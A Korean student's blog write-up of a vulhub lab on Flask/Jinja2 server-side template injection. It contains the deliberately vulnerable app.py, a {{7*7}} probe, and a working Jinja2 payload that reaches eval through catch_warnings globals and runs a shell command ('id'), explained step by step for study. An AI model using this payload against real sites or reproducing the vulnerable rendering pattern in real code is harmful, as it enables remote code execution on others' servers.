---
title: 플라스크 염소 발닦개로 전락시키기
published: 2026-04-28
tags: [CVE, vulhub, study, flask]
category: CVE
draft: false
---

# Description
Flask is a popular Python web framework that uses Jinja2 as its template engine. A Server-Side Template Injection (SSTI) vulnerability can occur when user input is directly rendered in Jinja2 templates without proper sanitization, potentially leading to remote code execution.

> Jinja2와 엮여 발생하는 SSTI 

**SSTI**: 사용자 입력 값이 기존 템플릿에 삽입되는 경우  
이러한 구문을 이용해 악성 페이로드를 삽입하여 임의 동작 수행 ㅇㅇ

개인적으로 다룰 수 있다. 라고 그나마 말할 수 있는게 플라스크라서, 이 쪽을 탐구하기로 함.  
그래봤자 `PoC` 돌리고, 코드 분석하고, 취약점 개요 설명하고.. 끝이지만..  
언젠가 내용이 많아도 읽고 싶게 되는, 그런 지식을 내가 만들 수 있다면 좋겠다.  

아니다.. 그렇게까지 가면 이미 지루하려나...?

---
# 환경 설정

`docker-compose.yml`
```yml
services:
 web:
   image: vulhub/flask:1.1.1
   volumes:
    - ./src:/app
   ports:
    - "8000:8000"
```

```
docker compose up -d
```

이후 `http://your-ip:8000/` 방문하면 기본 페이지가 보인다.  

주어진 파일 하나 `app.py`를 보면:
```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name', 'guest')

    t = Template("Hello " + name)
    return t.render()

if __name__ == "__main__":
    app.run()
```
위 내용이 보인다.  

`url`에 끼게 되는 `args` 중 `name`이라는 녀석의 값을 가져와  
그대로 템플릿에 렌더링 하는 듯..  

기본값은 `guest`.  

---
# 익스플로잇
템플릿에서 사용하게 되는 문법을 알고 이를 응용하여 악의적인 동작을 수행하면 된다.  
아 빨리 쓰고 주술회전 보러 가야지,..  

뭐였지, 한 반년 전인가? `GPT` 님께서 **SSTI** 테스트 할 때 {{7 * 7}} << 막 이런 거 넣으라고 했던 기억이 있다.  

그래서 저거 쓸거임 ㅇㅇ
```
http://your-ip:8000/?name={{7*7}}
```

들어가면 연산 결과가 반영되는 것을 확인 가능함!  

<a href="https://imgbb.com/"><img src="https://i.ibb.co/sdB3JhFx/2026-04-28-191916.png" alt="스크린샷 2026 04 28 191916" border="0"></a>

따라서 다음처럼 `eval()` 함수를 사용하여 파이썬 코드를 실행시키는  
`PoC` 코드 작성이 가능함  

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
이거 `url`에 걍 집어넣으면(`name`의 값으로) 

<a href="https://ibb.co/pBHbNh06"><img src="https://i.ibb.co/KptbBK0c/2026-04-28-192159.png" alt="2026-04-28-192159" border="0"></a>
이렇게 잘 뜸 ㅇㅇ  

---
# 왜?????????????????
이건 좀 궁금했다.  
왜 `PoC`를 저따구로 짜지?  
아니 아무리 템플릿 엔진 문법에 맞춘다 쳐도, 이건 좀 미친짓 아닌가????  
그도 그럴게 안 그래도 보기 싫은 % end어쩌고 %랑  

파이썬 문법을 {} 안에 섞어 쓰는 모습이 매우 변종같고  
그래 여기까..지는 몰라.  

사실 숏코딩에 대한 안 좋은 추억이 있어 거부감이 좀 심해진 건가??  

아니다. 그냥 해석하기 싫어서 억지를 부리고 있었다. 음,  
계속 진행하겠다  

이유는 `os.system()` 이걸 직접적으로 호출할 수 없어서..  
그러나 우회하여 들어가는 게 가능하단 사실..  

---
```python
{% for c in [].__class__.__base__.__subclasses__() %}
```
빈 리스트를 가져와 이 녀석의 클래스를 구하면 `list`가 나온다.  
`list`의 `base`는 부모 클래스 `object` 이고,  
`subclasses`는 하위 클래스를 반환한다.  

즉 파이썬에 있는 `object` 밑 다 집합~ 이런 거다

```python
{% if c.__name__ == 'catch_warnings' %}
```
위처럼 순회하면서, 이름이 `catch_warnings`인 경우를 찾는다.  
정확히는 그런 이름을 가진 클래스를 쫓는 것이다.  

왜일까? 아직 남은 객체는 많고, 벌써부터 좁히면 충분하지 않으며, 쓸모 있는 녀석들을 보려면 아직 더 남겨야 하기 때문이다, 라고 나는 생각한다.  

근데 관례 느낌이 좀 있는듯.. 따로 공부해야 할 것 같습니다;;  

---
```python
{% for b in c.__init__.__globals__.values() %}
```
`catch_warnings.__init__`을 가져와 `globals`에서 값들을 뽑는다.  
`__globals__` 친구는 속성이고, 어떤 함수가 정의된 모듈의 전역 네임스페이스를 담는 딕셔너리다.  

ex)
```python
base_value = 100  # 전역 변수

def my_func():
    return base_value

# 함수 객체의 __globals__ 확인하기
print(my_func.__globals__['base_value'])
```

---
```python
{% if b.__class__ == {}.__class__ %}
```
얜 그냥 딕셔너리의 클래스와 일치하는지 보는 거, 딕셔너리 아니면 상관 안 함 ㅇㅇ

```python
{% if 'eval' in b.keys() %}
```
걸러낸 딕셔너리 중 `eval` 키 찾기  
내장 함수 딕셔너리 찾으려는 시도인듯  

```python
{{ b['eval']('__import__("os").popen("id").read()') }}
```
b['eval']이 jinja2 거, 그 안 내용은 `python`에 맞춰져 있다.  
실행 결과 렌더링 하는 역할이고,  
안 파이썬 스크립트는 우회적으로 사용하는 부분.  

앞서 말한 바와 같이 우회적인 표현 안 쓰면 샌드박스 단에서 나가리 되는 정도라  
어쩔 수 없이 builtin문법..? 이걸 뭐라고 하더라, 암튼 내부 함수 친구들만 잘 써서  
돌려까기 하듯 가져온다.  

---
# 후기

어후.. 하루에 5개 하려니까 힘들다. 심지어 내일이 중간이다.  
뭐 내가 공부를 잘하는 것도 아니고 열심히 하는 편도 더더욱 아니라  
시험에 대해 말하는 건 어디까지나 의견 1, 의견 2에 해당한다고 생각한다.  

그래도 원치 않는 시험은 때때로 상당히 고통스럽다.  
끌끌..  

나머지 글도 잘 써두겠습니다..  

드림핵도 오늘 좀 올리려 했는데, 할 수 있으려나 모르겠다.